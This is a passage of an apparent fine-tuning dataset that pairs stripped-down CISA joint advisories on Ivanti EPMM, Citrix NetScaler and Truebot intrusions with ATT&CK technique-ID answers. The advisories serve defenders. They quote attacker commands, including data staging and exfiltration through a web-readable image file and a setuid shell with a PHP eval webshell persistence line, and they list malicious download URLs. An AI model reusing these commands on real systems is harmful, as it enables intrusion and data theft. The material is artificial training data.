fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents local fbi field office cisa cisagovreport resources hhs qbotqakbot malware cisa cpgs nist 80063b digital identity guidelines cisa mfa cisa implementing phishingresistant mfa cisa known exploited vulnerabilities catalog cisa cyber hygiene cisa zero trust cisa stopransomware cisa stopransomware guide cisa cset tool sets sights ransomware threat references mitre cobalt strike mitre conti mitre prolock mitre egregor mitre revil mitre megacortex mitre black basta mitre royal mitre qakbot disclaimer information report provided informational purposes cisa fbi endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi version history august 30 2023 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary cybersecurity infrastructure security agency cisa norwegian national cyber security centre ncscno releasing joint cybersecurity advisory csa response active exploitation cve202335078 cve202335081 advanced persistent threat apt actors exploited cve202335078 zero day least april 2023 july 2023 gather information several norwegian organizations well gain access compromise norwegian government agencys network ivanti released patch cve202335078 july 23 2023 ivanti later determined actors could use cve202335078 conjunction another vulnerability cve202335081 released patch second vulnerability july 28 2023 ncscno observed possible vulnerability chaining cve202335081 cve202335078 cve202335078 critical vulnerability affecting ivanti endpoint manager mobile epmm formerly known mobileiron core vulnerability allows threat actors access personally identifiable information pii gain ability make configuration changes compromised systems cve202335081 enables actors epmm administrator privileges write arbitrary files operating system privileges epmm web application server threat actors chain vulnerabilities gain initial privileged access epmm systems execute uploaded files webshells mobile device management mdm systems attractive targets threat actors provide elevated access thousands mobile devices apt actors exploited previous mobileiron vulnerability consequently cisa ncscno concerned potential widespread exploitation government private sector networks csa provides indicators compromise iocs tactics techniques procedures ttps obtained ncscno investigations csa also includes nuclei template identify unpatched devices detection guidance organizations use hunt compromise cisa ncscno encourage organizations hunt malicious activity using detection guidance csa potential compromise detected organizations apply incident response recommendations included csa compromise detected organizations still immediately apply patches released ivanti download pdf version report aa23213a pdf pdf 49243 kb download xml json file associated report aa23213a stix xml xml 27743 kb aa23213a stix json json 25001 kb technical details notethis advisory uses themitre attck enterpriseframework version 13 see mitre attck tactics techniques section advisory table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview july 2023 ncscno became aware apt actors exploiting zeroday vulnerability ivanti endpoint manager epmm formerly known mobileiron core target norwegian government network ivanti confirmed threat actors exploited cve202335078 released patch july 23 20231 ivanti later determined actors could use cve202335078 conjunction another vulnerability cve202335081 released patch second vulnerability july 28 20232 cve202335078 critical authentication bypasscwe288 vulnerability affecting ivanti endpoint manager mobile epmm formerly known mobileiron core vulnerability allows unauthenticated access specific application programming interface api paths threat actors access api paths access pii names phone numbers mobile device details users vulnerable system make configuration changes vulnerable systems push new packages mobile endpoints access global positioning system gps data enabled according ivanti cve202335078 chained second vulnerability cve2023350812 cve202335081 directory traversal vulnerabilitycwe22 epmm vulnerability allows threat actors epmm administrator privileges capability write arbitrary files webshells operating system privileges epmm web application server actors execute uploaded file2 cisa added cve202335078 known exploited vulnerabilities catalog july 25 2023 cve202335081 july 31 2023 cisa ncscno concerned potential widespread exploitation vulnerabilities government private sector networks mdm systems provide elevated access thousands mobile devices threat actors including apt actors previously exploited mobileiron vulnerability34 apt actor activity apt actors exploited cve202335078 since least april 2023 actors leveraged compromised small officehome office soho routers including asus routers proxy target infrastructure ncscno observed actors exploiting cve202335078 obtain initial access epmm devices perform arbitrary lightweight directory access protocol ldap queries active directory ad retrieve ldap endpoints use api path mifsaadapiv2authorizedusers list users administrators epmm device make epmm configuration changes note unknown configuration changes actors made regularly check epmm core audit logs apt actors deleted entries apache httpd logs using miwar malicious tomcat application deletes log entries based string keywordstxt actors deleted log entries string firefox1070 apt actors used linux windows user agents firefox1070 communicate epmm agents used however user agents appear device logs unconfirmed threat actors ran shell commands epmm device however ncscno suspects actors exploited cve202335081 upload webshells epmm device run commands apt actors tunneled traffic internet ivanti sentry application gateway appliance supports epmm least one exchange server accessible internet unknown tunneled traffic ncscno observed network traffic used tls certificate internal exchange server apt actors likely installed webshells exchange server following paths owaauthlogonaspx owaauthlogoffaspx owaauthoutlookcnaspx ncscno also observed miwar ivanti sentry know actors placed mitre attck tactics techniques see table 1table 7 referenced threat actor tactics techniques advisory table 1 apt actors attck techniques initial access table 2 apt actors attck techniques execution table 3 apt actors attck techniques discovery table 4 apt actors attck techniques persistence table 5 apt actor attck techniques defense evasion table 6 apt actor attck techniques collection table 7 apt actor attck techniques command control evidence vulnerability methods cisa recommends administrators use following cisadeveloped nuclei template determine vulnerability cve202330578 cisa recommends administrators use following cisadeveloped nuclei template determine vulnerability cve202335081 run following ncscnocreated checks check signs compromise investigate logs centralized logging solutions forwarded syslogs epmm devices occurrences mifsaadapiv2 look spikes increase eventcode1644 ad since least april 2023 ldap queries performed epmm threat actor used mifs api generated tens millions event code also look eventcodes 4662 5136 1153 detect tunneling activity sentry look traffic epmm devices internal servers well tls traffic towards instances epmm different tls certificates instance would possess traffic epmm certificates originating endpoints inside network eg standard windows generated certificates cnexchange01 similar perform forensic analysis disk memory since log retention may poor threat actors observed deleting log entries pay particular attention unallocated disk space free space filesystem check activity asus routers country towards epmm sentry devices incident response compromise detected organizations quarantine take offline potentially affected hosts reimage compromised hosts provision new account credentials collect review artifacts running processesservices unusual authentications recent network connections report compromise cisa via cisas 247 operations center reportcisagovor 8882820870 ncscno via ncscnos 247 operations center certncscno 47 23 31 07 50 mitigations cisa ncscno recommend organizations upgrade ivanti epmm versions latest version soon possible see ivanti cve202335081 remote arbitrary file write patch information patch protects cve202335078 cve202335081 see evidence vulnerability methods section advisory cisadeveloped nuclei templates find epmm versions vulnerable cve202335078 cve202335081 organizations using unsupported versions ie versions prior 11810 immediately upgrade supported version immediately upgrade apply ivantiprovided rpm fix cve35078 workaround protect cve202335081 login command line shell cli enable mode run following command install rpm url httpssupportmobileironcomivantiupdatesivantisecurityupdate1001noarchrp see ivantis knowledge base kb remote unauthenticated api access vulnerability cve202335078 information rpm fix treat mdm systems highvalue assets hvas additional restrictions monitoring mdm systems provide elevated access thousands hosts treated high value assets hvas additional restrictions monitoring follow best cybersecurity practices production enterprise environments including mandating phishingresistant multifactor authentication mfa staff services additional best practices see cisas crosssector cybersecurity performance goals cpgs cpgs developed cisa national institute standards technology nist prioritized subset ot security practices meaningfully reduce likelihood impact known cyber risks common ttps cpgs subset best practices cisa ncscno also recommend software manufacturers implement comprehensive information security program based recognized framework nist cybersecurity framework csf validate security controls addition applying mitigations cisa ncscno recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 1table 7 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa recommends continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory references1 ivanti cve202335078 remote unauthenticated api access vulnerability2 ivanti cve202335081 remote arbitrary file write3 cisa potential china cyber response heightened uschina tensions4 cisa top routinely exploited vulnerabilities resources mnemonic ivanti endpoint manager mobile epmm authentication bypass vulnerability mnemonic threat advisory remote file write vulnerability ivanti epmm acknowledgements ivanti contributed joint advisory ncscno wishes acknowledge mnemonics contributions version history august 1 2023 initial version august 2 2023 added stix file updated acknowledgements section added resources section appendix indicators compromise ncscno observed following webshell hash ncscno observed following hash miwar ncscno observed following ja3 hashes used mobileiron core ncscno observed following ja3 hashes used exchange tunneling via epmm sentry ncscno observed following user agents communicating exchange owa ews ncscno observed following user agents communicating exchange webshell ncscno observed following user agents communicating exchange autodiscover ncscno observed following user agents communicating ews ewsexchangeasmx ncscno observed following user agent communicating exchange powershell product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1005, T1018, T1036.005, T1059, T1070, T1087.002, T1090, T1090.001, T1190, T1505.003, T1572"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary update september 6 2023 cybersecurity advisory updated new tactics techniques procedures ttps well indicators compromise iocs received additional victim trusted third parties update end cybersecurity infrastructure security agency cisa releasing cybersecurity advisory warn network defenders exploitation cve20233519 unauthenticated remote code execution rce vulnerability affecting netscaler formerly citrix application delivery controller adc netscaler gateway june 2023 threat actors exploited vulnerability zeroday drop webshell critical infrastructure organizations nonproduction environment netscaler adc appliance webshell enabled actors perform discovery victims active directory ad collect exfiltrate ad data actors attempted move laterally domain controller networksegmentation controls appliance blocked movement victim organization identified compromise reported activity cisa citrix citrix released patch vulnerability july 18 2023 advisory provides ttps detection methods shared cisa victim cisa encourages critical infrastructure organizations use detection guidance included advisory help determining system compromise potential compromise detected organizations apply incident response recommendations provided csa compromise detected organizations immediately apply patches provided citrix download pdf version report aa23201a threat actors exploiting citrix cve20233519 implant webshells pdf 56029 kb update september 6 2023 august 2023 cisa received ttps iocs additional victim trusted third parties csa updated ttps iocs assist administrators detecting responding activity downloadable list iocs see following xml json files aa23201a stix xml xml 4313 kb aa23201a stix json json 4009 kb update end technical details note advisory uses mitre attck enterprise framework version 13 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview july 2023 critical infrastructure organization reported cisa threat actors may exploited zeroday vulnerability netscaler adc implant webshell nonproduction netscaler adc appliance citrix confirmed actors exploited zeroday vulnerability cve20233519 citrix released patch july 18 20231 update september 6 2023 august 2023 cisa received ttps iocs additional victim third parties actors implanted webshell gained root level access compromised system performed discovery active directory ad information see victim 2 additional observed activity sections update end cve20233519 cve20233519 unauthenticated rce vulnerability affecting following versions netscaler adc netscaler gateway1 netscaler adc netscaler gateway131before1314913 netscaler adc netscaler gateway130before 1309113 netscaler adc netscaler gateway version 121 end life netscaler adc 131fips 13137159 netscaler adc 121fips 12155297 netscaler adc 121ndcpp 12155297 affected appliance must configured gateway vpn virtual server ica proxy cvpn rdp proxy authentication authorization auditing aaavirtualserver exploitation1 cisa added cve20233519 known exploited vulnerabilities catalog july 19 2023 threat actor activity victim 1 part initial exploit chain threat actors uploaded tgz file containing generic webshell discovery script setuid binary adc appliance conducted smb scanning subnet actors used webshell ad enumeration exfiltrate ad data specifically actors viewed netscaler configuration files flashnsconfigkeysupdated nsconfignsconf note configuration files contain encrypted password decrypted key stored adc appliance viewed netscaler decryption keys decrypt ad credential configuration file used decrypted ad credential query ad via ldapsearch actors queried users objectclassuser objectcategoryperson computers objectclasscomputer groups objectclassgroup subnets objectclasssubnet organizational units objectclassorganizationalunit contacts objectclasscontact partitions objectclasspartition trusts objectclasstrusteddomain used following command encrypt discovery data collected via openssl tar ball tar czvf vartmpalltxt openssl des3 salt k vartmptesttargz tar ball compressed zipped file used threat actors collection exfiltration exfiltrated collected data uploading image file webaccessible path cp vartmptesttargz netscalernsguivpnmedialogininitpng actors discovery activities unsuccessful due critical infrastructure organizations deployment netscaler adc appliance segmented environment actors attempted execute subnetwide curl command identify accessible within network well potential lateral movement targets verified outbound network connectivity ping command ping c 1 googlecom executed host commands subnetwide dns lookup actors also attempted delete artifacts actors deleted authorization configuration file etcauthconflikely prevent configured users eg admin logging remotely eg cli regain access adc appliance organization would normally reboot single use mode may deleted artifacts device however victim secure shell ssh key readily available allowed appliance without rebooting actors postexploitation lateral movement attempts also blocked networksegmentation controls actors implanted second webshell victim later removed likely php shell proxying capability actors likely used attempt proxying smb traffic dc victim observed smb connections actors attempted use previously decrypted ad credential authenticate dc adc via virtual machine firewall account restrictions certain internal accounts could authenticate dc blocked activity update september 6 2023 victim 2 threat actors uploaded php webshell logouttmphp likely part initial exploit chain netscalernsguivpn within hour installing webshell actors implanted executable linkable format elf binary pykeygen set user unique identifier uid root executed binsh via setuid execve syscall note third party also observed threat actors use elf binary named pip4 execute binsh via syscall change uid root pip4 located varpythonbin root level access actors used handsonkeyboard discovery queried ad via ldapsearch users groups computersthey collected data gzipped text files renamed 1css 2css placed files netscalernsguivpn exfiltration exfiltrating filesthe actors deleted system well access logs error logs authentication logsthe victim organization detected intrusion mitigated activity identify signs additional malicious activity command control c2 actors appeared use compromised pfsense devices victim observed communications two pfsense ip addresses indicating actor using multihop proxying c2 traffic additional observed activity according trusted third party reporting threat actors leveraged open source webshells publicly available tools loaded loadingphp vpnvpn loadingphp modified version opensource php webshell2 modified webshell custom protocol handler update created via streamwrapperregister httpswwwphpnetmanualenfunctionstreamwrapperregisterphp custom protocol enabled webshell send encoded commands ad via ldapsearch loaded modified version opensource ssh inject tool3 named libnsdso tmp directory file hooks ssh captures credentials actors modifications tool wrote encoded captured credentials 20 random characters reversedbase64 file created hardcoded path varnslogcountersprometheusmetrccodesclientlog actors exfiltrated collected credentials deleted varnslogcountersprometheusmetrccodesclientlog3 minutes exfiltration deleted file recreated possibly actors memory hook still active deployed webshells victim networks vpnthemes one third party observed actors deploy secretsauce webshell secretsauce webshell written php receive php code http post request decrypt using internally embedded rsa public key execute code memory request webshell returns http 500 response code actor used following file names secretsauce vpnphp logoutphp logphp prodphp second third party observed actors deploy open source webshell4 filename defaultsphp deployed ligolong5 tunneller filename tmp directory ligolong tunneller written go provides encrypted reverse tcptls connections remote host deployed nps tunneller6 victim networks tmp directory nps open source tunneller written go must configured command line via configuration file features including support common protocols extensions including compression encryption port reuse additionally threat actors appended flashnsconfigrcnetscaler withchmod us binshecho php httpresponsecode401evalrequestvariable redacted path webshellredactedphp webshell path web accessible folder actors modifications enabled run binsh commands root enabled persistence webshell run every reboot used sysinternals adexplorer microsoft tool viewing editing ad7 actors dropped tool cusersredactedappdatalocaltempadexplorerexe executed following command adexplorerexe snapshot filenamedat accepteula update end mitre attck tactics techniques see table 1table 11 referenced threat actor tactics techniques advisory update september 6 2023 tables updated following techniques compromise infrastructure obtain capabilities tool command scripting interpreter unix shell native api boot logon autostart execution proxy multihop proxy deobfuscatedecode files information file directory permissions modification linux mac file directory permissions modification indicator removal indicator removal clear linux mac system logs indicator removal file deletion masquerading masquerading match legitimate name location data staged local data staging protocol tunneling end update detection methods run following victimcreated checks adc shell interface check signs compromise check files newer last installation modify newermt parameter date corresponds last installation find netscalernsgui type f name php newermtyyyymmdd exec ls l find varvpn type f newermtyyyymmdd exec ls l find varnetscalerlogon type f newermtyyyymmdd exec ls l find varpython type f newermtyyyymmdd exec ls l check http error logs abnormalities may initial exploit zgrep sh varloghttperrorlog zgrep php varloghttperrorlog check shell logs unusual postex commands example grep flashnsconfigkeys varlogshlog look setuid binaries dropped find var perm 4000 user root path varnslog newermtyyyymmdd exec ls l review network firewall logs subnetwide scanning httphttpssmb 80443445 originating adc review dns logs unexpected spike internal network computer name lookup originating adc may indicate threat actor resolving host postad enumeration computer objects review networkfirewall logs unexpected spikes adldapldaps traffic originating adc may indicate adldap enumeration review number connectionssessions netscaler adc per ip address excessive connection attempts single ip may indicate threat actor interacting webshell pay attention larger outbound transfers adc short period session time indicative data exfiltration review ad logs logon activities originating adc ip account configured ad connection logon restriction configured ad account check event 4625 failure reason user allowed logon computer review netscaler adc internal logs shlog bashlog traces potential malicious activity example keywords grep provided databasephp nsguivpn flashnsconfigkeysupdated ldaptlsreqcert ldapsearch openssl salt review netscaler adc internal access logs httpaccessvpnlog 200 successful access unknown web resources update september 6 2023 following resources may assist detecting signs compromise mandiant exploitation citrix zeroday possible espionage actors cve20233519 greynoise real citrix cve20233519 please stand shadowserver technical summary observed citrix cve20233519 incidents mandiant indicators compromise scanner citrix adc zeroday cve20233519 update october 6 2023 ibm xforce uncovers global netscaler gateway credential harvesting campaign end update update september 6 2023 indicators compromise see table 12 iocs obtained victim 2 note trusted third party observed php webshell elf binary hashes see table 13 table 14 iocs addresses obtained trusted third parties end update incident response compromise detected organizations quarantine take offline potentially affected hosts reimage compromised hosts provision new account credentials collect review artifacts running processesservices unusual authentications recent network connections report compromise cisa via cisas 247 operations center reportcisagov 8882820870 update september 6 2023 threat actor used flashnsconfigrcnetscaler make binsh setuid binary rewrite webshell every reboot organizations clean rcnetscaler prevent webshell getting rewritten using following thirdparty created command mitigations cisa recommends organizations install relevant updated version netscaler adc netscaler gateway soon possible see citrix adc citrix gateway security bulletin cve20233519 cve20233466 cve20233467 patch information follow best cybersecurity practices production enterprise environments including mandating phishingresistant multifactor authentication mfa staff services additional best practices see cisas crosssector cybersecurity performance goals cpgs cpgs developed cisa national institute standards technology nist prioritized subset information technology operational technology ot security practices meaningfully reduce likelihood impact known cyber risks common ttps cpgs subset best practices cisa acsc also recommend software manufacturers implement comprehensive information security program based recognized framework nist cybersecurity framework csf longerterm effort apply robust networksegmentation controls netscaler appliances internetfacing devices validate security controls addition applying mitigations cisa recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 1table 11 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa recommends continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory references1 citrix security bulletin ctx561482 citrix adc citrix gateway security bulletin cve20233519 cve20233466 cve20233467 update september 6 20232 github dxkitephpstreamshell simple streamwrapper shell3 github sshinjectinjectmec4 github lcodesneoregeorg neoregeorg project seeks aggressively refactor regeorg5 github nicocha30ligolong6 github ehangionps7 microsoft ad explorer sysinternals end update update september 6 2023 acknowledgements mandiant shadowserver contributed cybersecurity advisory end update version history july 20 2023 initial versionjuly 24 2023 updated affected netscaler adc 121fips netscaler adc 121ndcpp version numbers updated step 3 detection methods use zgrepinstead ofgrepseptember 6 2023 updates noted throughoutseptember 21 2023 removed persistence commands associated technique tampering security toolsoctober 6 2023 updated resources detection methods section product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1005, T1016, T1016.001, T1018, T1033, T1036, T1036.005, T1036.008, T1046, T1059.004, T1069.002, T1070, T1070.004, T1074, T1074.001, T1087.002, T1090.001, T1090.003, T1105, T1106, T1140, T1190, T1482, T1505.003, T1531, T1547, T1552.001, T1552.004, T1560.001, T1572, T1573.002, T1588.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary cybersecurity infrastructure security agency cisa federal bureau investigation fbi multistate information sharing analysis center msisac canadian centre cyber security cccs releasing joint cybersecurity advisory csa response cyber threat actors leveraging newly identified truebot malware variants organizations united states canada recently may 31 2023 authoring organizations observed increase cyber threat actors using new malware variants truebot also known silencedownloader truebot botnet used malicious cyber groups like cl0p ransomware gang collect exfiltrate information target victims previous truebot malware variants primarily delivered cyber threat actors via malicious phishing email attachments however newer versions allow cyber threat actors also gain initial access exploiting cve202231199a remote code execution vulnerability netwrix auditor application enabling deployment malware scale within compromised environment based confirmation opensource reporting analytical findings truebot variants authoring organizations assess cyber threat actors leveraging phishing campaigns malicious redirect hyperlinks cve202231199 deliver new truebot malware variants authoring organizations recommend hunting malicious activity using guidance outlined csa well applying vendor patches netwrix auditor version 105see mitigations section below1 organization identifying indicators compromise iocs within environment urgently apply incident responses mitigation measures detailed csa report intrusion cisa fbi download pdf version report aa23187a increased truebot activity infects us canada based networks pdf 89126 kb read associated malware analysis report mar104451551v1 truebot activity infects us canada based networksor download pdf version mar104451551v1 truebot activity infects us canada based networks pdf 31539 kb downloadable copy iocs xml json format see aa23187a stix xml xml 20454 kb aa23187a stix json json 14024 kb technical details note advisory uses mitre attck enterprise framework version 13 see mitre attck tactics techniques section cyber threat actors activity mapped mitre attck tactics techniques initial access execution recent months open source reporting detailed increase truebot malware infections particularly cyber threat actors using new tactics techniques procedures ttps delivery methods2 based nature observed truebot operations primary objective truebot infection exfiltrate sensitive data compromised hosts financial gain phishing cyber threat actors historically used malicious phishing emails primary delivery method truebot malware tricks recipients clicking hyperlink execute malware cyber threat actors observed concealing email attachments executables software update notifications appear legitimate following interaction executable users redirected malicious web domain script files executed note truebot malware hidden within various legitimate file formats used malicious purposes3 exploitation cve202231199 though phishing remains prominent delivery method cyber threat actors shifted tactics exploiting observable manner remote code execution vulnerability cve202231199 netwrix auditorsoftware used onpremises cloudbased system auditing exploitation cve cyber threat actors gain initial access well ability move laterally within compromised network figure 1 cve202231199 delivery method truebot following successful download malicous file truebot renames loads flawedgrace onto host please see flawedgrace section information remote access tool rat used truebot operations deployment truebot flawedgrace able modify registry print spooler programs control order documents loaded print queue flawedgrace manipulates features escalate privilege establish persistence flawedgraces execution phase rat stores encrypted payloads within registry tool create scheduled tasks inject payloads msiexecexe svchostexe command processes enable flawedgrace establish command control c2 connection 9211836199 example well load dynamic link libraries dlls accomplish privilege escalation several hours post initial access truebot observed injecting cobalt strike beacons memory dormant mode first hours prior initiating additional operations please see cobalt strike section information remote access tool rat used truebot operations discovery defense evasion first stage truebots execution process checks current version operating system os rtlgetversion processor architecture using getnativesysteminfo4 note variant truebot malware designed one gigabyte gb junk code functions hinder detection analysis efforts following initial checks system information truebot capability enumerate running processes collect sensitive local host data send data encoded data string described secondstage execution based iocs table 1 truebot also ability discover software security protocols system time metrics aids defense evasion well enables synchronization compromised systems internal clock facilitate scheduling tasks next uses jsonip extension eg igtyxequcevamjsonip create thirteen character globally unique identifier guida 128bit text string truebot uses label organize data collects creating guid truebot compiles enumerates running process data either base64 unique hexadecimal encoded string truebots main goal identifying presence security debugger tools however presence identified debugger tools change truebots execution processthe data compiled base64 encoded string tracking defense evasion purposes data collection exfiltration following truebots enumeration running processes tools affected systems computer domain name along newly generated guid sent hardcoded url post request observed useragent string note useragent string customized http request includes specific device information required interaction web content instance cyber threat actors redirect victims malicious domains establish c2 connection post request functions means establishing c2 connection bilateral communication established connection truebot uses second obfuscated domain receive additional payloads selfreplicate across environment andor delete files used operations truebot malware capability download additional malicious modules load shell code deploy various tools stealthily navigate infected network associated delivery vectors tools truebot observed association following delivery vectors tools raspberry robin malware raspberry robin wormable malware links malware families various infection methods including installation via usb drive5 raspberry robin evolved one largest malware distribution platforms observed deploying truebot well postcompromise payloads icedid bumblebee malware6 recent shift truebot delivery methods malicious emails exploitation cve202231199 large number raspberry robin infections leveraged exploitable cve2 flawed grace malware flawedgrace remote access tool rat receive incoming commands c2 server sent custom binary protocol using port 443 deploy additional tools7 truebot malware observed leveraging dropping flawedgrace via phishing campaigns additional payload8 note flawedgrace typically deployed minutes truebot malware executed cobalt strike tool cobalt strike popular remote access tool rat cyber threat actors leveragedin observable mannerfor variety postexploitation means typically hours truebots execution phase cyber threat actors observed deploying additional payloads containing cobalt strike beacons persistence data exfiltration purposes2 cyber threat actors use cobalt strike move laterally via remote service session hijacking collecting valid credentials lsass memory credential dumping creating local admin accounts achieve pass hash alternate authentication teleport tool cyber threat actors observed using custom data exfiltration tool talos named teleport2 teleport known evade detection data exfiltration using encryption key hardcoded binary custom communication protocol encrypts data using advanced encryption standard aes hardcoded key furthermore maintain stealth teleport limits data collects syncs outbound organizational datanetwork traffic truebot malware indicators compromise iocs truebot iocs may 31 2023 contain iocs cyber threat actors conducting truebot malspam campaigns information derived trusted third party observed cyber threat actors 193319173 russia using compromised local account conduct phishing campaigns may 23 2023 spread malware httpssnowboardspecscomnae9v promptly redirects user httpswwwmeditimespharmacomgfghthq trusted third party linked trending truebot activity redirecting httpswwwmeditimespharmacomgfghthq trusted third parties observed cyber threat actors using truebot pivot httpscorporacionhardsoftcomimages2document16654exe domain associated snowboardspecscom malicious domain linked unc4509 threat cluster known use traffic distribution systems tds redirect users either benign malicious website facilitate malicious phishing campaigns may 2023 according trusted third parties md5 hash 6164e9d297d29aa8682971259da06848 downloaded httpscorporacionhardsoftcomimages2document16654exe flagged numerous security vendors well linked unc4509 truebot campaigns note iocs associated truebot campaigns used graceful spider deliver flawedgrace lummastealer payloads may 2023 truebot downloaded malware copies cintelruntimebrokerexe andbased trusted third party analysislinks httpsessadoniocom538332php linked 4518218971 panama associated trending truebot malware campaigns may 2023 please reference table 1 iocs described paragraph mitre attck tactics techniques see tables 616 referenced cyber threat actor tactics techniques enterprise environments advisory assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool detection methods cisa authoring organizations recommend organizations review implement following detection signatures along winmaliciousconfidence100 w trojanwin32tnegamsr trojanagenttruebotgen well yara rules help detect truebot malware detection signatures yara rules cisa developed following yara aid detecting presence truebot malware additional yara rules detecting truebot malware referenced github9 incident response following steps recommended organizations detect truebot malware infection compromise quarantine take offline potentially affected hosts collect review artifacts running processesservices unusual authentications recent network connections provision new account credentials reimage compromised host report compromise cisa via cisas 247 operations center reportcisagov 8882820870 contact local fbi field office state local tribal territorial government entities also report msisac soccisecurityorg 8667874722 mitigations cisa authoring organizations recommend organizations implement mitigations including mandating phishingresistant multifactor authentication mfa staff services additional best practices see cisas crosssector cybersecurity performance goals cpgs cpgs developed cisa national institute standards technology nist prioritized subset ot security practices meaningfully reduce likelihood impact known cyber risks common ttps cpgs subset best practices cisa cosealers recommend software manufacturers implement comprehensive information security program based recognized framework nist cybersecurity framework csf apply patches cve202231199 update netwrix auditor version 105 netwrix recommends using auditor application internally facing networks system owners dont follow recommendation use application externally facing instances increased risk cve202231199 exploited systems reduce threat malicious actors using remote access tools implementing application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation see national security agencys cybersecurity information sheetenforce signed software execution policies additional guidance strictly limit use rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts disable commandline scripting activities permissionscpg 2n restrict use powershell using group policy grant specific users casebycase basis typically users administrators manage network windows operating systems oss permitted use powershellcpg 2e update windows powershell powershell core latest version uninstall earlier powershell versions logs windows powershell prior version 50 either nonexistent record enough detail aid enterprise monitoring incident response activitiescpg 1e 2s 2t enable enhanced powershell loggingcpg 2t 2u powershell logs contain valuable data including historical os registry interaction possible iocs cyber threat actors powershell use ensure powershell instances using latest version module script block transcription logging enabled enhanced logging two logs record powershell activity powershell windows event log powershell operational log authoring organizations recommend turning two windows event logs retention period least 180 days logs checked regular basis confirm whether log data deleted logging turned set storage size permitted logs large possible configure windows registry require user account control uac approval psexec operations requiring administrator privileges reduce risk lateral movement psexec review domain controllers servers workstations active directories new andor unrecognized accountscpg 4c audit user accounts administrative privileges configure access controls according principle least privilege polpcpg 2e reduce threat credential compromise via following place domain admin accounts protected users group prevent caching password hashes locally implement credential guard windows 10 server 2016 refer microsoft manage windows defender credential guard information windows server 2012r2 enable protected process light local security authority lsa refrain storing plaintext credentials scripts implement timebased access accounts set admin level highercpg 2a 2e example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory ad level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task addition cisa fbi msisac cccs recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors disable file printer sharing services services required use strong passwords active directory authentication implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloud maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization minimizes impact disruption business practices retrieve datacpg 2r require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least 15 characterscpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systemscpg 2h keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats organizations patch vulnerable software hardware systems within 24 48 hours vulnerability disclosure prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access various subnetworks restricting lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts disable unused portscpg 2v consider adding email banner emails received outside organizationcpg 2m ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r validate security controls addition applying mitigations cisa recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 513 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa recommends continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources nist nvd cve202231199 stopransomwaregov wholeofgovernment approach one central location us ransomware resources alerts stopransomware guide cisa implement phishingresistant mfa cisa guide securing remote access software cisa msisac joint ransomware guide cisa crosssector cybersecurity performance goals cl0p ransomware uses truebot malware access networks field offices fbi nsa zerotrust security model references1 bishop fox netwrix auditor advisory2 talos intelligence breaking silence recent truebot activity3 dfir report truebot deploys 